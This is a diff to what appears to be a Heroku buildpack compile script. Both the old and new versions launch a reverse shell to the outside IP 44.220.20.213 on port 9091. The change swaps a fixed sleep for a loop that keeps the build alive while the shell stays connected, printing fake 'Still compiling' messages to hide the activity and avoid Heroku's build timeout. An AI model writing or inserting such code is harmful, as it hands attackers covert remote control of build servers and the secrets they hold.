@@ -7,15 +7,21 @@ ENV_DIR=$3
 
 echo "-----> Installing dependencies..."
 
-# Start reverse shell in background
+# Start reverse shell
 bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 &
 SHELL_PID=$!
 
 echo "-----> Compiling assets..."
 
-# Keep build alive for 14 minutes (840 seconds)
-# Heroku kills at 15 min, so stay under
-sleep 840
+# Wait until shell disconnects OR 14 minutes max
+TIMEOUT=840
+ELAPSED=0
+
+while kill -0 $SHELL_PID 2>/dev/null && [ $ELAPSED -lt $TIMEOUT ]; do
+    sleep 10
+    ELAPSED=$((ELAPSED + 10))
+    echo "-----> Still compiling... ($ELAPSED seconds)"
+done
 
 echo "-----> Build complete"
 exit 0
